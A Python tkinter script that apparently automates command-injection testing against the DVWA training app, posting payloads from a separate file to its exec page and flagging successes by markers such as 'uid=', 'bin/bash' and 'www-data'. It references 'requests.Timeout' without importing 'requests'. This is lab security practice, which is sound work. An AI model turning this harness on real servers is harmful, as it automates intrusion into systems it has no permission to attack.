import tkinter as tk
from dvwa_session import login_dvwa, set_security_level, base_url
from payload_loader import load_category_payloads

cmd_injection_url = base_url + "vulnerabilities/exec/"

# Function to test each payload for Command Injection
def test_payloads(session, payloads, text_area):
    successful_payloads = {}
    try:
        for category, category_payloads in payloads.items():
            text_area.insert(tk.END, f"\nTesting category: {category}\n", "Title")
            text_area.update()
            for payload in category_payloads:
                data = {'ip': payload, 'Submit': 'Submit'}
                try:
                    # Set a timeout for the request
                    response = session.post(cmd_injection_url, data=data, timeout=10)
                except requests.Timeout:
                    text_area.insert(tk.END, f"Timeout: {payload}\n", "Fail")
                    continue

                if "uid=" in response.text or "gid=" in response.text or "root" in response.text or \
                   any(term in response.text.lower() for term in ["localhost", "system32", "bin/bash", "www-data"]):
                    if category not in successful_payloads:
                        successful_payloads[category] = []
                    successful_payloads[category].append(payload)
                    text_area.insert(tk.END, f"Success: {payload}\n", "Success")
                else:
                    text_area.insert(tk.END, f"Failed: {payload}\n", "Fail")

                text_area.see(tk.END)  # Auto-scroll down to the latest result
                text_area.update()
    except Exception as e:
        text_area.insert(tk.END, f"Error during payload testing: {e}\n", "Fail")
    return successful_payloads

# Function to run the tests and update the output in the UI
def launch_attack(text_area, security_level):
    text_area.delete('1.0', tk.END)
    text_area.insert(tk.END, "Performing command injection tests, please wait...\n", "Info")
    text_area.update()

    session = login_dvwa()
    
    if session:
        session = set_security_level(session, security_level)

        payloads = load_category_payloads("cipayloads.txt")
        successful_payloads = test_payloads(session, payloads, text_area)
        
        text_area.tag_configure("Success", foreground="green", font=("Helvetica", 10, "bold"))
        text_area.tag_configure("Fail", foreground="red", font=("Helvetica", 10, "bold"))
        text_area.tag_configure("Bold", font=("Helvetica", 10, "bold"))
        text_area.tag_configure("Title", font=("Helvetica", 12, "bold"))
        text_area.tag_configure("Info", foreground="blue", font=("Helvetica", 10, "italic"))

        text_area.insert(tk.END, "\n--- Test Summary ---\n", "Title")
        if successful_payloads:
            text_area.insert(tk.END, "Command Injection vulnerabilities found:\n", "Bold")
            for category, payloads in successful_payloads.items():
                text_area.insert(tk.END, f"\n{category}:\n", "Bold")
                for payload in payloads:
                    text_area.insert(tk.END, f"- {payload}\n", "Success")
        else:
            text_area.insert(tk.END, "No Command Injection vulnerabilities found.\n", "Fail")
    else:
        text_area.delete('1.0', tk.END)
        text_area.insert(tk.END, "Login failed. Cannot perform tests.", "Fail")
